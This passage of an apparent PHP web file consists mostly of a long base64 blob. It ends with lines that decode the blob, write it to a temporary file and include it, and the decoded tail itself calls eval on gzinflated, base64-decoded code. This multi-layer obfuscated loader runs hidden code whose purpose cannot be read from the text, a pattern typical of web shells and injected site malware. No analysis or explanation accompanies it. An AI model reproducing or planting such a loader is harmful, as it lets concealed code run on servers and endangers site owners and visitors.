pN05mRU5zMlhWT0lTRHFSTlcvcHNsUUIxOFN0aFVld3ZxUWpTcG9XVjJIbEZIUkF1dnc2NVhIb0w2Tk9weStmM1U2TkNISXBkSGUrZzlrb1BOV1NYb3c1cXhJVVBjdERheHBDb1N4bCtSN0lmZkp5Q3B1RGRBZnpjczAwOW1nOXBBUVJxekFQb1VBU0lKZ2R3MURjd3N0M0FsS0FBZU04QlBnY0VpU3RlSFJNaFlva1F5Z1FQMjd5N1FZVjVmMk1XMlVFWmtwRmRNN0NhZS9qNEdYc0pmT0VJY0EvOWtpVU04anBIVHV4VStwazlPZG1XQmk2ZG5pVFMyVWR1ZzFpNTZrSHR2LzZ6di96NUwvL3ByLy83Zi9nM2IrSWNMa1BpSEZHS3NQS21RYnBaUGFHU0xFaTZhcnpyZGRWazN4eUZhb25ZNmlzTWh6bnBtblBWOTV0VUFUdXZ2UFB2N0ltb3k5bDZZQmtJYWdLdjMwbzFqbVZOTS85SmlEUVZVSVk2VFhtdUFwL0hzdmdhUHNjRE5zYUFoaFpvakdUallmL3RTOHpUcTZ3VGRSUmY5cjQ4RndSY3duN0hQTTJIR3d1dkRicTBKSXdGbUhBNnJvMVVid1dYVGZENHRrU1JYMTNiQW9pQm90cXpJQ2tLUTZjOFBIUHg0WU5YSXp5Mzl6NStoc3RoZWdtQ2N4Mi80TDBHdXBzYnp4YjZWVE9XTXlRcDJLbGxQMDBTL1JRYWhCMmkrRWdvRi84clFUTjd1TFRRNzEwb1NrVE1DTVZEb3ZHbmFNOFJZeHNKeTdoRkQ3emdOazdvRmxMYU93R2ppbEZWeVJjVzR5Smh6OFRTTTRKUWwwVS9JT084RU5XUmxRYU5nNm5pazVpWEJiazB2b2NnbDhiM0grVFMrTDBJY21rc0NzcG9QQlBrTWpScU5NbkhTR1ppWDVMWWpqRUZMbVZiUnpZRHllR2NRSmR6UzlaQitaaEM0WUNaSWRBeW1tUzRNZ2ZoTHBrQzhVRXhSUm9VRTF1TldHeG5ndU55ekNkUUZ1UFRYNFpQRUVVWm1jN244UW5QNGl2NVgxMkpSak9PaWVhSmRid0lMNThTemZNVmdsTzBxZTE2U1R4UFVpdnkrbnhFVHdwTmc5UzlQS29uS1JjVDFkTm5aUnNad25nK3p0cExKdXB0RVl4SFhMMFhsQ0t1ZzZEYkVBRVJ0a0RRbjAvR2diOTNpNURnditHTm0yQ21GSGZKQUJXT3pBQkkwdjcrTXNhRnAwYk1QR1QrTGs0UUJ3RnZ6S2w2bjNOc01hWU5LR2Vmc2FiRlp5WXBpNm9JUEl2VzBMT2gzaVZaNmtaRlp5YXdrQi9iZ2pYLzI4b0pQcnVSNWhNOCtYTHlPd1dOelJxTXovZndsVHVqSHgzaXc1WG5YbEFWREdCbzJhNjlBbWRIaUxUcXFyS3pzdUJ6ejZ0eDlOaHZ4OFYrcWhhWGlQMzJYcVE0dzIyd0RCRnVrNlRJbERCMGNVOFllZCtkOUw5dEhlUUk1R3JYb2hWM1pMRzlJQUlveEJKVjhSY0NaNndsdHBNMGhtZ1FaNU9FQ2FVRXZMczBxQ1c0b2xBOUtmNlF4N3V4Qlc1WmdMa1FYcCtUUlRtczRRRUhId2xBK2pTN0FXcjU0eDZINWpvcVhkRFBuMEdIZUwrSUt5UmdLY05lQ0ZJYmpsK0thOFFDSmZlNWtPU0Z3dmd0THlQaFIvLzNrQ0E2ZnVsSW1GTy9rYS9aa3NCREVKdEpJa2ZDYnV1cmRpbEN1NmJQM2oybG14WGVBcEZRcHFuemJvS0dLRFJSRDhNR2ZzeG43TUpmc1dNMlJKN2Y0TU9hRVZuYmIrRzFmY3l1ZE1Db3lEZnNubDJQNDhxL1lhbEdhR2F5UUJQTjhyNnpSVGU1SmgyL0tVanlSR1NrL0NVbXNtNGtWWmE4ZFNoY1JtcStYNGEzNWEvUWNLQmI5MlN4dHNxRXlaMDFNNUJCdngyUHY1b0FXaFpCNWEzNWxqeWNjVUFCUFhBbFZRMUpVRGo2MGJva1FVM2NSVjE4akdTTzVHZ0RQQVFKV3RyN01EV1V3YWY3ckpIeXl1SU5Rd0kvdTE4WTJDTUNUcHY0ZXNBNVBRS1JZaWwzVlUxVkJGajBFazhTajdja21iQjNUTDYrSEFJWUV4U0ZGL1VQRTJvNGlFVk1TU1F3K3RVWTFnZkJhTmxkQzhyaXo4VlhqOGduYk1qUytBQ2NiSWhFVi9XaDVxcVdZTHRZbTliaDZQSVpVeGgvcW9SM0RoajNnUGxuVEgvNFozLzBkeVE4UWZSc0tRVG1IOWZGelBQNHlNRkdPTnlJWjRZd2k2alZJYysrNVFyYktRSVM2SDNjVHFPL3Q4akhuYWJnRTJZdjZrWk1XMWlxeEFRdjJsL040OTFPVWlzUXErZE9DY1BXa2JHUndUYm41K3pBWC96TlgvN3ZYLzNQdi8zTm4vemliLy96YzUySUpUTWtUaDdabUwwVG5zcXc4ekloOXRybGgwWkJPaGs5K1hwMkVBUkZqbTV2YjVJVE1zcDBpTHkzbTBxeEFmRlMyQ1ZBZFoya3lNZWN4MzFmZmU4ZDUxTlhaUWlUdE05blp1aFI1TVNVQVJkRDNzRThqcG5PRitHMzd3SThBd014MFBraS9KNFBnd09lODBYOFp3RVVlRGNnS1BpemdCNkVMRWNFNGM5OEtGeHhOTkRQaDRCNDQyaWRpeVhGaC9FZG1yMVBtOHp0dnppTGdRWG81UVlqdTdGRkxVYmtNQ0lTdkNjeTJRa1d2dlBYdlZtQ09HNzZSSUs1Zk1KTXlZOURReWRMWEdSc2h1akN0S2dYLzk4YlNrbW9qcGdjSEpHWUNmSVJEUFNPVE1tV3lSY29sbWdvanZBNFR4RGpZZHh4eHJZVUJXRHhGK2pYSVBpdUpDSnRUVVFDZ3NPaUZyNWwwQmRGaUR5UGdEZ0M2R1dJaW01SzNQYjJOcVRqMWZqUUFDbjBFSHB3eVJTVWhVMEc3TTJDbjBqdDBNc1grT2pHRWZHY0JZTmJEaWNNSi9URENiSXQ5MVVQQlNCQTFRUmc5dFIyenlwZTJpWnMySEU5aUxYRjJVUERRR1l6Z2VOdlNhWnBjNmhiaG1qUUhPSnRQZmgrekRUcCt3ZDZ4d2V6MkF6VG5Zc1I4aFpoOVVUcE94S0tTeGsrRnZEWjVjS0tTb1dseGZXK2hUdlJ5dTZUVHhmQWNscnp1aDhsbzI1R01Jd0V2S3pUVVVsY0RwZjZuZTkzaEFBOHFPYjBNTXFkMy8rcTlidzFVSzFvbCtKU2hYaDVZT2dGdlMwU0t4QU92QnkxQXVnUEFZeVJBekZpQmNTSUZSQ3hGVkF0YWdOWVdhQ2RjR0dPT1MrTXJqMWxYYzY4Z3JnMVFlbGtNc2tzanI0cnBqUGE5am40YmtXNEhtYnQyb1FEa0djMVRMUytZKzZpbVI0c0NWVC9JbnlFZzNSTkdaY1RoQkg3REN2V0Z5MUgyVFduL3dVVlp0V0pHVGttMzArS3JES3hzL2t1amx6R21JYlpwV2JjU3NKZkpoVC8rQy8rL2QvLzYvLzF4ejhueXdMMC83Lzd4Ui85cS8vNEwvNzBiL3dFaU5ISWZjRlZKalM0WFdqNXdGSC9IenJuaVZrOHZHeUJ3TVRSQzA3OVl2emlubDBkRUFjNE1wSE9ic1hPeFdIUXdCSUZzUTNqVGh2bk9BWStTOXNmclY1WUFReGJtRmVOYThjL2g0eVpSejRNSFZmdFRXSFZYUXpmZEF4V0tkNXFnczU5SFJsQmgyZlhZREY0T0Y0Tkp0Y1JpREpmTEFkNTNyeWJlK0YrWXNBWG54RUgrQ1d5bTRpV2J6SHphM2JuMEF1UCtTM0pXdTN5MWIydFdvdTdlV1VGTFc1a1k3U3kzS2ljMTF1Vis5TGhZUVBNODF0dVhzNHV0OEpuc3R2Sk5QcVg0V0g3Zko2SWZvcHFlRmIraGRMNUdRVno4YnIyMnhETVdER2t3NjdmYXVvN0hiY1cvRzJUejI5bm8rUVZPeVJGTkFhOXZnYXNuMmRzRGVqOHphUE5CWlVvK05NTUw2MlE5T3ZvcmNhNXZSLzNVYjZQZlpSZ2p2VlpObEptRk9tM1pDc0Z4eS8raEdpNEpQenh0M0krQ1NKbEd0cTArS3FBdU8vd1BESVVCdGViSGo1empobHFKUFlEd0R6OW5LZWFzMFlpZEtUNSt1UExPUUYxWTA4d1gzcE95YzFHeXlXZVJ4SFI4Uktac0FYaHcza1BJRmlSQnA4ZmpaUE5YaXlaM2l5ZGQ3WU9MaHMyWFk2RXdSS0h0VWFsM0tvM2J1K2JsY3RTbzRRZVYrZlMxQWNJVTRRaVRXUGFSWS9reURmalEwQndDMzFBL0VlOGI0aDZidEJ6UEV2WWVPZFVMdjgvIjsKZXZhbChnemluZmxhdGUoYmFzZTY0X2RlY29kZSgkY29kZSkpKTsKPz5kaXY+PC9ib2R5Pgo8L2h0bWw+Cg==');
file_put_contents($tmp, $c);
include $tmp;